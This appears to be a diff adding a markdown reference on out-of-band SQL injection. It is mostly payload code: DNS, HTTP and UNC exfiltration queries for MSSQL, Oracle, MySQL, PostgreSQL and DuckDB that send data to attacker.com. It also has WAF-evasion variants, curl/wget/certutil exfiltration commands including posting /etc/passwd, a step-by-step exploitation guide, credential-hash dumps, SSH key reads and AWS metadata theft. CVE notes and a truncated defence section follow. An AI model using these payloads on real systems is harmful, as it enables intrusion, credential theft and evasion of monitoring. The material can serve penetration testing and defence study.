+ATTACH 'https://internal-server.corp/analytics.duckdb' AS internal (READ_ONLY);
+SELECT * FROM internal.sensitive_table
+\`\`\`
+DB: DuckDB | Function: ATTACH+httpfs | Protocol: HTTPS | Privilege: Query execution | Expected: Remote database query
+
+**P-DK-15**: Glob + read_text -- recursive file system enumeration
+\`\`\`sql
+SELECT filename, size, content FROM read_text('/home/*/.ssh/id_rsa')
+\`\`\`
+DB: DuckDB | Function: read_text+glob | Protocol: Filesystem | Privilege: Query execution | Expected: SSH private keys from all users
+
+### DNS Encoding Payloads (10)
+
+**P-DNS-01**: MSSQL hex-encoded subdomain
+\`\`\`sql
+DECLARE @d VARCHAR(512);
+SET @d=(SELECT TOP 1 CONVERT(VARCHAR(512),CAST(name AS VARBINARY(256)),2) FROM sysobjects WHERE xtype='U');
+EXEC('xp_dirtree "\\\\'+@d+'.oob.attacker.com\\x"')
+\`\`\`
+DB: MSSQL | Protocol: DNS | Encoding: Hex | Expected: hex_tablename.oob.attacker.com
+
+**P-DNS-02**: MSSQL chunked exfil with sequence numbers
+\`\`\`sql
+DECLARE @d VARCHAR(4000),@c INT;
+SELECT @d=(SELECT TOP 1 long_column FROM table1);SET @c=1;
+WHILE @c<=LEN(@d) BEGIN
+  EXEC('master..xp_dirtree "\\\\'+CAST((@c/30) AS VARCHAR)+'.'+SUBSTRING(@d,@c,30)+'.oob.attacker.com\\x"');
+  SET @c=@c+30;
+END
+\`\`\`
+DB: MSSQL | Protocol: DNS | Encoding: Raw+chunked | Expected: seq.chunk.oob.attacker.com
+
+**P-DNS-03**: Oracle RAWTOHEX encoding
+\`\`\`sql
+SELECT RAWTOHEX(UTL_RAW.CAST_TO_RAW((SELECT password FROM users WHERE ROWNUM=1))) FROM dual
+\`\`\`
+DB: Oracle | Encoding: Hex | Use: Pipe into subdomain for DNS-safe exfil
+
+**P-DNS-04**: Oracle Base64 encoding for DNS
+\`\`\`sql
+SELECT REPLACE(UTL_RAW.CAST_TO_VARCHAR2(
+  UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW('secret_data'))),'=','-') FROM dual
+\`\`\`
+DB: Oracle | Encoding: Base64url | Use: More efficient than hex (33% overhead vs 100%)
+
+**P-DNS-05**: MySQL HEX encoding
+\`\`\`sql
+SELECT HEX((SELECT password FROM users LIMIT 1))
+\`\`\`
+DB: MySQL | Encoding: Hex | Use: Wrap in LOAD_FILE CONCAT for DNS exfil
+
+**P-DNS-06**: MSSQL character replacement for DNS safety
+\`\`\`sql
+SELECT REPLACE(REPLACE(REPLACE(@data, ' ', '-'), '.', '-'), '\\', '-')
+\`\`\`
+DB: MSSQL | Encoding: Character replacement | Use: Remove DNS-invalid chars
+
+**P-DNS-07**: Oracle character replacement for DNS safety
+\`\`\`sql
+SELECT REPLACE(REPLACE(REPLACE(username,' ','-'),'$','-'),'_','-') FROM all_users
+\`\`\`
+DB: Oracle | Encoding: Character replacement | Use: Remove DNS-invalid chars
+
+**P-DNS-08**: Oracle chunked SUBSTR exfil
+\`\`\`sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY % x SYSTEM "http://'
+  ||SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,40)
+  ||'.attacker.com/"> %x;]>'),'/l') FROM dual
+\`\`\`
+DB: Oracle | Protocol: DNS | Encoding: Raw+chunked (40-char offset) | Expected: first_40_chars.attacker.com
+
+**P-DNS-09**: MySQL CONCAT chunking
+\`\`\`sql
+SELECT LOAD_FILE(CONCAT('\\\\\\\\',SUBSTRING((SELECT password FROM users LIMIT 1),1,40),'.attacker.com\\\\a'))
+\`\`\`
+DB: MySQL | Protocol: DNS | Encoding: Raw+chunked | Expected: first_40_chars.attacker.com (Windows only)
+
+**P-DNS-10**: PostgreSQL string_agg with chunking
+\`\`\`sql
+COPY (SELECT '') TO PROGRAM 'nslookup '||substring((SELECT string_agg(usename,',') FROM pg_user),1,40)||'.attacker.com'
+\`\`\`
+DB: PostgreSQL | Protocol: DNS | Encoding: Raw+chunked | Expected: first_40_chars.attacker.com
+
+### WAF Evasion Payloads (15)
+
+**P-WAF-01**: MSSQL -- dynamic SQL to hide xp_dirtree
+\`\`\`sql
+DECLARE @x NVARCHAR(4000);
+SET @x=N'mas'+N'ter..xp_'+N'dir'+N'tree "\\\\data.attacker.com\\a"';
+EXEC(@x);
+\`\`\`
+DB: MSSQL | Bypass: String concatenation evades keyword detection
+
+**P-WAF-02**: MSSQL -- hex-encoded EXEC
+\`\`\`sql
+EXEC(0x780070005F0064006900720074007200650065)
+\`\`\`
+DB: MSSQL | Bypass: Hex-encoded procedure name (xp_dirtree in Unicode)
+
+**P-WAF-03**: MSSQL -- square bracket notation
+\`\`\`sql
+EXEC [master]..[xp_dirtree] '\\\\attacker.com\\a'
+\`\`\`
+DB: MSSQL | Bypass: Bracket notation changes signature
+
+**P-WAF-04**: MSSQL -- xp_fileexist fallback (when xp_dirtree blocked)
+\`\`\`sql
+EXEC master..xp_fileexist '\\\\attacker.com\\share'
+\`\`\`
+DB: MSSQL | Bypass: Alternative function, same UNC mechanism
+
+**P-WAF-05**: MSSQL -- xp_subdirs fallback (rarely in WAF rules)
+\`\`\`sql
+EXEC master..xp_subdirs '\\\\attacker.com\\share'
+\`\`\`
+DB: MSSQL | Bypass: Third UNC function, almost never blocked
+
+**P-WAF-06**: MSSQL -- OPENROWSET fallback (when all xp_* blocked)
+\`\`\`sql
+SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.com;uid=sa;pwd=x','SELECT 1')
+\`\`\`
+DB: MSSQL | Bypass: Different protocol path (TCP instead of SMB)
+
+**P-WAF-07**: MSSQL -- CLR Assembly (when all built-in OOB blocked)
+\`\`\`sql
+-- Requires sysadmin: deploy custom .NET assembly that makes HTTP calls
+-- Bypasses all function-level WAF rules since it is custom code
+CREATE ASSEMBLY HttpDb FROM 0x4D5A90... WITH PERMISSION_SET=EXTERNAL_ACCESS
+\`\`\`
+DB: MSSQL | Bypass: Custom code, no keyword signature
+
+**P-WAF-08**: Oracle -- UTL_INADDR fallback (when UTL_HTTP revoked)
+\`\`\`sql
+SELECT UTL_INADDR.GET_HOST_ADDRESS('data.attacker.com') FROM dual
+\`\`\`
+DB: Oracle | Bypass: DNS-only, no HTTP grant needed
+
+**P-WAF-09**: Oracle -- DBMS_LDAP fallback (when UTL_HTTP+UTL_INADDR revoked)
+\`\`\`sql
+SELECT DBMS_LDAP.INIT('data.attacker.com',389) FROM dual
+\`\`\`
+DB: Oracle | Bypass: Rarely restricted, often PUBLIC access
+
+**P-WAF-10**: Oracle -- HTTPURITYPE fallback (separate grant from UTL_HTTP)
+\`\`\`sql
+SELECT HTTPURITYPE('http://attacker.com/'||data).GETCLOB() FROM dual
+\`\`\`
+DB: Oracle | Bypass: Different code path from UTL_HTTP
+
+**P-WAF-11**: Oracle -- XMLType XXE (when all UTL/DBMS revoked)
+\`\`\`sql
+SELECT XMLType('<!DOCTYPE x [<!ENTITY % r SYSTEM "http://attacker.com/'||(SELECT user FROM dual)||'">%r;]><x/>') FROM dual
+\`\`\`
+DB: Oracle | Bypass: XML parser code path, bypasses network ACLs on unpatched
+
+**P-WAF-12**: Oracle -- EXECUTE IMMEDIATE to hide function names
+\`\`\`sql
+BEGIN EXECUTE IMMEDIATE q'[SELECT UTL_HTTP.REQUEST('http://attacker.com/') FROM dual]'; END;
+\`\`\`
+DB: Oracle | Bypass: Dynamic PL/SQL hides keywords from WAF
+
+**P-WAF-13**: MySQL -- hex for UNC path
+\`\`\`sql
+SELECT LOAD_FILE(0x5c5c6174746163...)
+\`\`\`
+DB: MySQL | Bypass: Hex-encoded file path
+
+**P-WAF-14**: PostgreSQL -- dollar-quoted strings
+\`\`\`sql
+COPY (SELECT $$$$) TO PROGRAM $$nslookup data.attacker.com$$
+\`\`\`
+DB: PostgreSQL | Bypass: Dollar quoting avoids single-quote detection
+
+**P-WAF-15**: PostgreSQL -- CHR() concatenation
+\`\`\`sql
+COPY (SELECT '') TO PROGRAM CHR(110)||CHR(115)||CHR(108)||CHR(111)||CHR(111)||CHR(107)||CHR(117)||CHR(112)
+\`\`\`
+DB: PostgreSQL | Bypass: Character code construction hides keywords
+
+### OS Command OOB Payloads (10)
+
+**P-OS-01**: Windows -- nslookup DNS exfil
+\`\`\`
+nslookup DATA.attacker.com
+\`\`\`
+Platform: Windows | Protocol: DNS | Use: Via xp_cmdshell or COPY TO PROGRAM
+
+**P-OS-02**: Windows -- certutil HTTP exfil
+\`\`\`
+certutil -urlcache -split -f http://DATA.attacker.com/file c:\\windows\\temp\\x
+\`\`\`
+Platform: Windows | Protocol: HTTP+DNS | Use: Signed Microsoft binary, proxy-aware
+
+**P-OS-03**: Windows -- PowerShell DNS resolve
+\`\`\`
+powershell Resolve-DnsName DATA.attacker.com
+\`\`\`
+Platform: Windows | Protocol: DNS | Use: PowerShell-based DNS resolution
+
+**P-OS-04**: Windows -- PowerShell HTTP exfil
+\`\`\`
+powershell -c "IWR http://attacker.com/?d=DATA"
+\`\`\`
+Platform: Windows | Protocol: HTTP | Use: Full HTTP client
+
+**P-OS-05**: Linux -- nslookup DNS exfil
+\`\`\`
+nslookup DATA.attacker.com
+\`\`\`
+Platform: Linux | Protocol: DNS | Use: Via COPY TO PROGRAM
+
+**P-OS-06**: Linux -- dig DNS exfil
+\`\`\`
+dig DATA.attacker.com
+\`\`\`
+Platform: Linux | Protocol: DNS | Use: More reliable than nslookup on some distros
+
+**P-OS-07**: Linux -- host command DNS exfil
+\`\`\`
+host DATA.attacker.com
+\`\`\`
+Platform: Linux | Protocol: DNS | Use: Lightweight DNS lookup
+
+**P-OS-08**: Linux -- curl HTTP exfil
+\`\`\`
+curl http://attacker.com/?d=DATA
+\`\`\`
+Platform: Linux | Protocol: HTTP | Use: Full HTTP client
+
+**P-OS-09**: Linux -- wget POST file exfil
+\`\`\`
+wget --post-file /etc/passwd http://attacker.com/exfil
+\`\`\`
+Platform: Linux | Protocol: HTTP | Use: Bulk file exfiltration
+
+**P-OS-10**: Windows -- chunked hex DNS exfil (large data)
+\`\`\`cmd
+cmd /v /c "ipconfig > output && certutil -encodehex -f output output.hex 4 && powershell $text=Get-Content output.hex;$subdomain=$text.replace(' ','');$j=11111;foreach($i in $subdomain){$final=$j.tostring()+'.'+$i+'.file.attacker.com';$j+=1;nslookup $final}"
+\`\`\`
+Platform: Windows | Protocol: DNS | Use: Multi-line output via sequenced hex DNS queries
+
+---
+
+## Exploitation (10 Steps: OOB Confirmation to Full Data Dump)
+
+### Step 1: Identify Injection Point
+Find a parameter, cookie, or header that is interpolated into a SQL query. Confirm injection exists via standard techniques (error, boolean, syntax break).
+
+### Step 2: Determine Database Type
+Fingerprint the backend: \`@@version\` (MSSQL), \`banner FROM v$version\` (Oracle), \`version()\` (MySQL/PG). Use error message syntax or conditional timing if blind.
+
+### Step 3: Set Up OOB Listener
+Launch Burp Collaborator or interactsh. Record the unique callback domain.
+
+### Step 4: Confirm OOB Connectivity
+Inject the minimum viable OOB payload for the identified database (see Detection and Validation section). Verify DNS/HTTP interaction arrives at the listener.
+
+### Step 5: Enumerate Databases
+Extract database names via OOB subdomain encoding. MSSQL: \`master..sysdatabases\`. Oracle: \`all_users\` or \`v$database\`. PostgreSQL: \`pg_database\`.
+
+### Step 6: Enumerate Tables
+Extract table names for the target database. Iterate with OFFSET or ROWNUM to cycle through tables one per DNS query.
+
+### Step 7: Enumerate Columns
+Extract column names for high-value tables (users, credentials, sessions, payments).
+
+### Step 8: Extract Sensitive Data
+Extract passwords, tokens, PII from identified columns. Use hex encoding and chunking for large values.
+
+### Step 9: Escalate Access (Stager)
+If the data volume justifies it, pivot to the Stager technique: enable xp_cmdshell, write a webshell, or create a database user for direct connection.
+
+### Step 10: Document Evidence
+Record every OOB interaction with timestamps, DNS query logs, HTTP request logs, and the SQL payloads that triggered them. Screenshots of Collaborator/interactsh output. This is the evidence that proves exploitation.
+
+---
+
+## Post-Exploitation
+
+### OOB to RCE Per Database
+
+| Database | OOB to RCE Path | Privilege Required |
+|----------|----------------|-------------------|
+| MSSQL | xp_cmdshell -> arbitrary OS commands | sysadmin |
+| MSSQL | OLE Automation -> download+execute stager | sysadmin+OLE |
+| MSSQL | CLR Assembly -> custom .NET code in SQL | sysadmin |
+| Oracle | UTL_HTTP -> download webshell + DBMS_SCHEDULER execute | DBA |
+| Oracle | Java stored procedure -> Runtime.exec() | CREATE JAVA PRIVS |
+| PostgreSQL | COPY TO PROGRAM -> arbitrary OS commands | Superuser |
+| PostgreSQL | system() C UDF -> arbitrary OS commands | Superuser+CREATE |
+| DuckDB | read_csv_auto/httpfs -> file read + HTTP exfil | Query execution |
+
+### Credential Extraction
+
+Once OOB connectivity is confirmed, extract authentication material:
+
+\`\`\`sql
+-- MSSQL: SQL login hashes
+SELECT name, password_hash FROM sys.sql_logins
+
+-- MSSQL: Windows service account
+SELECT service_account FROM sys.dm_server_services
+
+-- Oracle: DBA password hashes
+SELECT username, password FROM dba_users
+
+-- PostgreSQL: MD5 password hashes
+SELECT usename, passwd FROM pg_shadow
+\`\`\`
+
+### Cloud Pivot
+
+If the database runs on a cloud instance with an attached IAM role:
+
+1. Use OOB (UTL_HTTP, COPY TO PROGRAM+curl, DuckDB read_csv_auto) to reach \`http://169.254.169.254/latest/meta-data/iam/security-credentials/\`
+2. Extract temporary AWS credentials (AccessKeyId, SecretAccessKey, SessionToken)
+3. Use credentials to access AWS services: S3 buckets, Lambda functions, Secrets Manager, DynamoDB
+4. Potentially escalate to full AWS account compromise
+
+---
+
+## Detection Evasion
+
+### Fallback Chains Per Database
+
+When the primary OOB function is blocked, systematically try alternatives:
+
+\`\`\`
+MSSQL:  xp_dirtree -> xp_fileexist -> xp_subdirs -> fn_xe_file_target_read_file
+        -> OPENROWSET -> OLE Automation -> CLR Assembly -> Linked Server DNS
+        -> WebDAV UNC (HTTP instead of SMB)
+
+Oracle: UTL_HTTP -> UTL_INADDR -> DBMS_LDAP.INIT -> HTTPURITYPE
+        -> XMLType XXE -> DBMS_XMLGEN -> UTL_TCP -> UTL_SMTP
+
+MySQL:  LOAD_FILE -> INTO OUTFILE UNC -> LOAD DATA INFILE -> UDF custom library
+
+PgSQL:  COPY TO PROGRAM -> dblink_connect -> CREATE EXTENSION dblink
+        -> lo_export UNC (Windows) -> system() C UDF
+\`\`\`
+
+### 15 Firewall/WAF Bypass Techniques
+
+| # | Technique | Database | Description |
+|---|-----------|----------|-------------|
+| 1 | Alternative UNC function | MSSQL | xp_fileexist/xp_subdirs when xp_dirtree blocked |
+| 2 | OPENROWSET outbound TCP | MSSQL | TCP connection instead of SMB, different signature |
+| 3 | CLR Assembly | MSSQL | Custom .NET code, no keyword match possible |
+| 4 | Linked Server DNS | MSSQL | sp_addlinkedserver forces hostname DNS resolution |
+| 5 | WebDAV UNC (port 80) | MSSQL | UNC over HTTP instead of SMB, bypasses port 445 blocks |
+| 6 | UTL_INADDR DNS-only | Oracle | When UTL_HTTP revoked, DNS still works |
+| 7 | DBMS_LDAP.INIT | Oracle | Rarely restricted, forces DNS lookup via LDAP init |
+| 8 | HTTPURITYPE | Oracle | Separate grant from UTL_HTTP, different code path |
+| 9 | XMLType XXE | Oracle | XML parser bypasses network ACLs on unpatched |
+| 10 | EXECUTE IMMEDIATE | Oracle | Dynamic PL/SQL hides function names from WAF |
+| 11 | String concatenation | Cross-DB | \`'mas'+'ter..xp_'+'dir'+'tree'\` breaks keyword matching |
+| 12 | Hex/Unicode encoding | MSSQL | \`EXEC(0x7870...)\` -- WAF sees hex, not function name |
+| 13 | Comment injection | Cross-DB | \`xp_dir/**/tree\` or \`UTL_HT/**/P\` splits keywords |
+| 14 | Case randomization | Cross-DB | \`xP_DiRtReE\` -- WAFs with exact-match miss these |
+| 15 | Dollar-quoted strings | PostgreSQL | \`$$nslookup data.attacker.com$$\` avoids quote detection |
+
+---
+
+## Variations and Edge Cases
+
+### Windows-Only Techniques (UNC Path Dependency)
+
+UNC paths (\`\\\\hostname\\share\`) are a Windows-specific mechanism. They trigger SMB connections that include DNS resolution. Functions that accept file paths (xp_dirtree, LOAD_FILE, lo_export, ATTACH DATABASE) only trigger OOB callbacks when the underlying OS resolves UNC paths.
+
+**Impact**: MySQL on Linux has effectively zero OOB capability. PostgreSQL on Linux uses COPY TO PROGRAM (OS commands) instead of UNC paths. MSSQL on Linux (since 2017) cannot use UNC-based OOB functions -- xp_cmdshell with nslookup/curl is required instead.
+
+### Oracle ACL Restrictions and Bypasses
+
+Since Oracle 12c, network utility packages (UTL_HTTP, UTL_INADDR, UTL_TCP, UTL_SMTP) require explicit network ACL grants. Without them, calls raise \`ORA-24247\` (network access denied by access control list).
+
+**Bypass order**:
+1. DBMS_LDAP.INIT -- often granted to PUBLIC, not covered by same ACL
+2. XMLType XXE -- uses XML parser, separate code path from network ACLs (unpatched only)
+3. SYS.DBMS_LDAP.INIT -- SYS schema variant may have different grants
+4. DBMS_XMLGEN -- XML generation with embedded external entities
+
+### MySQL Linux Limitation
+
+PentestMonkey explicitly notes DNS exfiltration from MySQL on Linux is "Impossible?" via standard SQL functions. The only path: deploy a UDF (User Defined Function) compiled as a shared library (\`.so\`) that implements network operations. This requires write access to \`@@plugin_dir\` and the CREATE FUNCTION privilege -- both significant barriers.
+
+### PostgreSQL Superuser Requirement
+
+COPY TO PROGRAM requires superuser. Starting with PostgreSQL 11, the \`pg_execute_server_program\` role can also execute it. However, most PostgreSQL deployments do not grant this role to application-level users. If superuser is not available, the only OOB path is dblink (requires extension installation + DBA privileges).
+
+### SQLite -- Effectively No OOB
+
+SQLite runs in-process with no server daemon and no built-in networking. The only OOB paths are:
+- \`ATTACH DATABASE '//attacker.com/z' AS z\` -- Windows only, UNC path
+- \`load_extension('\\\\attacker.com\\share\\evil.dll')\` -- Windows only, disabled by default
+
+For practical purposes, SQLite has no OOB capability.
+
+### DuckDB Embedded OOB (Novel)
+
+DuckDB's in-process architecture means OOB happens through legitimate features (HTTP fetch, S3 access) rather than utility functions. No special privileges needed -- if the application allows SQL expressions to reach DuckDB, full OOB capability is available. See the dedicated DuckDB subsection under Level 4 Techniques.
+
+### Asynchronous OOB (Fire-and-Forget)
+
+Some applications execute SQL asynchronously -- the query is submitted to a queue and processed after the HTTP response is sent. Boolean blind and time-based blind both fail because there is no response timing to measure. OOB is the only technique that works because the outbound callback is independent of the web response lifecycle.
+
+### DNS over HTTPS (DoH) Exfiltration
+
+If the database host uses DNS over HTTPS resolvers (Cloudflare 1.1.1.1, Google 8.8.8.8 via DoH), traditional DNS monitoring at the network perimeter will not see the exfiltration queries -- they are encrypted inside HTTPS. This makes OOB exfiltration even harder to detect but does not change the attacker's methodology.
+
+---
+
+## Modern Stack Specifics
+
+### DuckDB in Analytics Pipelines
+
+> **See also:** The dedicated DuckDB subsection under Level 4 Techniques provides comprehensive coverage of the embedded OLAP OOB paradigm, including CVE-2024-9264 complete analysis, DuckDB security controls and their gaps, function surface reference, modern data stack attack surface analysis, and the "invisible database problem."
+
+DuckDB is increasingly embedded in data engineering tools. In every case, it runs in-process with the host application's permissions, cloud credentials, and file system access. The injection patterns vary by tool:
+
+- **dbt (data build tool)**: Jinja2-to-SQL compilation. Supply chain attack via malicious dbt package overriding adapter macros executes with DuckDB's full capabilities including \`read_csv_auto()\`, httpfs, and S3 credential access
+- **Jupyter Notebooks**: \`duckdb.sql()\` or JupySQL \`%%sql\` magic. Runs as kernel user -- often a service account with IAM roles for data lake access
+- **BI Tools (Metabase, Superset, Redash)**: Custom SQL queries in dashboards. DuckDB engine has no sandboxing beyond what the BI tool provides
+- **Apache Airflow / Dagster / Prefect**: DuckDB operators in DAGs. Untrusted DAG parameters (API triggers, webhooks) enable OOB from the orchestrator's execution environment
+- **Evidence.dev**: SQL-based reporting with DuckDB as default data source. SQL in Markdown files
+- **Streamlit / Gradio**: Data apps with user-provided filter values interpolated into \`duckdb.sql()\` calls
+- **MotherDuck**: Hybrid execution -- local queries retain full local permissions, cloud queries are sandboxed
+- **DuckDB-WASM (Browser)**: Browser sandbox **neutralizes all OOB vectors** -- no filesystem, CORS restrictions on HTTP, no shell execution
+
+The common pattern: DuckDB runs in-process, inheriting the host application's network access, file system permissions, and cloud credentials. There is no database-level firewall to configure. The defense pattern from Grafana's CVE-2024-9264 patch applies: use a sandboxed SQL engine with a function allowlist, or set \`enable_external_access=false\` and \`lock_configuration=true\` before any user-influenced SQL executes.
+
+### Cloud-Native Databases (OOB Limitations)
+
+| Cloud Service | OOB Status | Notes |
+|--------------|------------|-------|
+| AWS RDS (MSSQL) | Limited | xp_cmdshell disabled, no sysadmin, but xp_dirtree may work |
+| AWS RDS (PostgreSQL) | Blocked | COPY TO PROGRAM disabled, no superuser |
+| AWS RDS (Oracle) | Restricted | Network ACLs managed by AWS, limited UTL_HTTP access |
+| AWS Aurora | Restricted | Lambda integration may provide alternative OOB path |
+| Azure SQL | Limited | Similar to RDS -- most OOB functions disabled |
+| GCP Cloud SQL | Restricted | Managed environment limits OOB functions |
+| Supabase (PostgreSQL) | Blocked | COPY TO PROGRAM disabled, but dblink may be available |
+
+**Key insight**: Managed cloud databases disable the most dangerous OOB functions (xp_cmdshell, COPY TO PROGRAM) but may leave lower-privilege UNC-path functions (xp_dirtree, xp_fileexist) accessible.
+
+### Serverless Functions as OOB Targets
+
+Lambda/Cloud Functions that execute SQL (via connection pooling to RDS) may produce OOB callbacks that originate from the Lambda execution environment's NAT gateway IP -- not the database server IP. This complicates detection correlation but does not prevent exfiltration.
+
+### Container Network Policies
+
+Kubernetes NetworkPolicy and Docker network isolation can block OOB by restricting egress from database containers. However:
+- DNS (port 53) is usually allowed for service discovery
+- CoreDNS/kube-dns proxying makes DNS exfiltration queries look like legitimate cluster DNS traffic
+- Without explicit egress deny rules, all outbound traffic is permitted by default
+
+---
+
+## Real-World Examples
+
+### Enterprise CVEs (10)
+
+#### CVE-2023-48788 -- Fortinet FortiClientEMS (CVSS 9.8)
+Unauthenticated SQLi in DAS component against MSSQL backend. Exploitation uses stacked queries to re-enable xp_cmdshell (\`sp_configure\`) and execute arbitrary commands. Webhook.site used as OOB callback for target validation. CISA KEV listed. Active exploitation confirmed by Kaspersky (October 2024). Horizon3.ai published complete PoC chain.
+
+#### CVE-2024-43468 -- Microsoft SCCM (CVSS 9.8)
+> **Cross-reference**: Also documented on [01-Classic-In-Band.md](01-Classic-In-Band.md) as a classic stacked-query SQLi. OOB relevance documented here as primary.
+
+Unauthenticated SQLi in MP_Location service. Queries execute as the SCCM machine account with sysadmin role on MSSQL. All OOB techniques (xp_dirtree DNS, xp_cmdshell, OLE Automation) directly applicable with maximum privilege. Synacktiv PoC released November 2024. CISA KEV added February 2026.
+
+#### CVE-2024-8924 -- ServiceNow (CVSS 8.7)
+> **Cross-reference**: Also documented on [04-Boolean-Based-Blind.md](04-Boolean-Based-Blind.md) as a boolean-based blind SQLi. OOB relevance documented here for DNS exfiltration path.
+
+Unauthenticated blind SQLi in core Now Platform. Boolean-based and time-based confirmed. OOB/DNS exfiltration is the optimal exploitation path for data extraction at scale from this blind vector.
+
+#### CVE-2024-6670 -- Progress WhatsUp Gold (CVSS 9.8)
+Pre-auth SQLi in \`HasErrors\` method enables admin password change. MSSQL backend with xp_dirtree/xp_cmdshell OOB chains directly applicable. Active RCE attacks since August 2024 (Trend Micro). CISA KEV listed. Metasploit module published.
+
+#### CVE-2023-34362 -- MOVEit Transfer (CVSS 9.8)
+> **Cross-reference**: Also documented on [01-Classic-In-Band.md](01-Classic-In-Band.md) as the largest SQLi breach in history and on [04-Boolean-Based-Blind.md](04-Boolean-Based-Blind.md) with context note. OOB exfiltration channel analysis is primary here.
+
+SQLi in \`/human.aspx\` against MSSQL backend. Cl0p ransomware group deployed LEMURLOOT webshell as persistent OOB exfiltration channel. 3,000+ US entities, 8,000+ organizations globally, ~94 million individuals. The defining SQLi-to-OOB breach chain of the decade.
+
+#### CVE-2024-42327 -- Zabbix Server (CVSS 9.9)
+SQLi in \`CUser.get\` API function (\`addRelatedObjects\`). Exploitable by any user with API access (default User role). Supports MySQL, PostgreSQL, and Oracle backends. Oracle deployments enable UTL_HTTP/UTL_INADDR OOB. PostgreSQL deployments enable COPY TO with DNS exfiltration.
+
+#### CVE-2021-27101 -- Accellion FTA (CVSS 9.8)
+SQLi via crafted Host header. FIN11/Cl0p deployed DEWMODE webshell as persistent OOB channel. ~100 organizations attacked, ~25 significant data theft (Shell, Kroger, Morgan Stanley, Qualys, Singtel, Reserve Bank of New Zealand).
+
+#### CVE-2024-9264 -- Grafana DuckDB (CVSS 9.9/8.8)
+SQL expression injection via DuckDB CLI in Grafana 11.x. Viewer-level access (lowest auth). Requires DuckDB binary on server. DuckDB httpfs enables HTTP OOB exfiltration, \`read_blob\`/\`read_text\` enable arbitrary file read, \`getenv\` extracts environment variables, \`shellfs\` community extension enables RCE. Grafana removed the entire feature in the patch and replaced it with a sandboxed SQL engine with function allowlist. Affected: 11.0.0-11.0.5, 11.1.0-11.1.6, 11.2.0-11.2.1. See dedicated DuckDB subsection under Level 4 Techniques for complete analysis.
+
+#### CVE-2024-36412 -- SuiteCRM (CVSS 10.0)
+Perfect CVSS score. Unauthenticated SQLi in \`responseEntryPoint\` via \`event\` parameter. CRM databases contain high-value PII. OOB techniques enable stealthy extraction of customer records without application-layer logging.
+
+#### CVE-2024-21080 -- Oracle E-Business Suite (CVSS 6.5)
+SQLi in REST Services component. Oracle-native target -- UTL_HTTP, UTL_INADDR, DBMS_LDAP, and HTTPURITYPE OOB techniques directly applicable. EBS contains financial, HR, and supply chain data.
+
+### Technical Writeups (6)
+
+| Source | Title | Key Technique |
+|--------|-------|--------------|
+| Horizon3.ai | CVE-2023-48788 FortiClientEMS Deep Dive | MSSQL xp_cmdshell re-enablement, webhook.site OOB callback |
+| NetSPI | Second-Order SQLi with Stored Procedures and DNS-Based Egress | xp_dirtree DNS exfiltration in real pentest engagement |
+| Ryan Wendel | DNS Exfiltration through Blind SQLi in MSSQL via Burp Collaborator | Hex-encoded DNS subdomains with ordering prefixes |
+| Tarlogic | Red Team Tales 0x01: From MSSQL SQLi to RCE | xp_cmdshell to certutil HTTP exfiltration (signed binary, proxy-aware) |
+| PentestBlog | Data Exfiltration with DNS in SQLi Attacks | All-DBMS DNS exfiltration comparison, 30x speed vs. time-based |
+| Lee Chun How | Out-of-Band SQL Injection (InfoSec Write-ups) | Burp Collaborator as universal OOB listener for bug bounty |
+
+### Conference Talks (3)
+
+| Talk | Presenter | Conference | Contribution |
+|------|-----------|-----------|-------------|
+| OAST: Out-of-Band Application Security Testing | PortSwigger Research | PortSwigger Blog | Coined OAST term; Collaborator democratized OOB testing; zero false positives methodology |
+| DNS Exfiltration and Out-of-Band Attacks | Nitesh Shilpkar (PwC Singapore) | DeepSec 2018 | DNS protocol abuse, xp_dirtree/UTL_HTTP practical examples, detection guidance |
+| Cracking the Lens | James Kettle (PortSwigger) | Black Hat USA 2017 | OOB callbacks for invisible infrastructure; Collaborator Everywhere extension |
+
+### Academic Research (2)
+
+| Paper | Author | Contribution |
+|-------|--------|-------------|
+| Data Retrieval over DNS in SQL Injection Attacks (arXiv 1303.3047) | Miroslav Stampar (sqlmap author) | Foundational paper; implemented sqlmap \`--dns-domain\`; performance benchmarks |
+| DNS Exfiltration Detection in the Presence of Adversarial Attacks (IJIS 2023) | Various | Detection evasion arms race; slow exfiltration patterns; legitimate-looking domain generation |
+
+---
+
+## Skill Progression Path
+
+| Level | Skill | Milestone |
+|-------|-------|-----------|
+| **0 -- Foundations** | Understand DNS as a data channel, OOB concept | Can explain how a DNS query carries data |
+| **1 -- First Callback** | Basic xp_dirtree/UTL_INADDR DNS test | Trigger a DNS callback in a lab environment |
+| **2 -- Data Extraction** | SUBSTRING chunking, hex encoding | Extract a password via DNS subdomains |
+| **3 -- Multi-DB** | Oracle XXE, MSSQL OLE, PostgreSQL COPY | Exploit OOB across 3+ database engines |
+| **4 -- Stager** | Deploy persistent exfil channel via OOB bootstrap | Use OOB to stage a webshell or enable xp_cmdshell |
+| **5 -- Evasion** | WAF bypass chains, encoding, alternative functions | Extract data when primary OOB functions are blocked |
+| **6 -- Cloud/Modern** | DuckDB httpfs, cloud metadata SSRF, OAST methodology | Exploit OOB in modern analytics stacks and cloud environments |
+| **7 -- Custom Tooling** | Build DNS/HTTP listeners, automate exfil reassembly | Write Python listener that decodes chunked hex DNS exfil |
+| **8 -- APT-Level** | Cl0p playbook analysis, async OOB, persistent channels | Understand and replicate enterprise-scale OOB breach patterns |
+
+---
+
+## Defensive Countermeasures
+
+### Network-Level Defenses
+
+| Control | Effectiveness | Notes |
+|---------|--------------|-------|
+| **Egress filtering on DB servers** | HIGH | Block all outbound DNS/HTTP/SMB from database hosts. Route DNS through internal-only resolvers. |
+| **DNS monitoring** | HIGH | Alert on DNS queries from database server IPs to novel/external domains. Database servers should rarely be DNS-active. |
+| **Network segmentation** | HIGH | Isolate database servers in a dedicated VLAN with no direct internet access. |
+| **Block SMB outbound (port 445)** | MEDIUM | Prevents UNC-based exfiltration but not DNS or HTTP OOB. |
+| **DNS sinkhole for anomalous queries** | MEDIUM | Detect unusual subdomain lengths (>20 chars), hex patterns, high entropy labels. |
+
+### Database-Level Defenses
+
+| Control | Database | Notes |
+|---------|----------|-------|
+| Disable xp_cmdshell | MSSQL | \`sp_configure 'xp_cmdshell', 0; RECONFIGURE;\` |
+| Disable OLE Automation | MSSQL | \`sp_configure 'Ole Automation Procedures', 0;\` |
+| Disable Ad Hoc Distributed Queries | MSSQL | Blocks OPENROWSET |
